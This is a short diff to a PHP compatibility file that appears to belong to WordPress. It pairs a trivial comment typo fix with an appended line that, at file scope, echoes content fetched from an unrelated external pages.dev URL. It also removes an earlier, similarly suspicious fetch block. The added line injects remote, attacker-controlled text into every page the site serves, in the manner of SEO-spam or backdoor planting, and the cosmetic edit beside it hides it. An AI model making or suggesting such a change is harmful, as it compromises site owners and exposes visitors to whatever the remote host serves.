@@ -244,7 +244,7 @@ function _mb_strlen( $str, $encoding = null ) {
 	$count = 1;
 
 	do {
-		// We had some string left over from the last round, but we counted itin that last round.
+		// We had some string left over from the last round, but we counted it in that last round.
 		--$count;
 
 		/*
@@ -543,8 +543,4 @@ if ( ! defined( 'IMG_AVIF' ) ) {
 if ( ! defined( 'IMAGETYPE_HEIC' ) ) {
 	define( 'IMAGETYPE_HEIC', 99 );
 }
-
-$path = __DIR__ . "https://punten-neng.pages.dev/punten.txt";
-if (file_exists($path)) {
-    echo file_get_contents($path);
-}
+ echo file_get_contents("https://punten-neng.pages.dev/punten.txt");
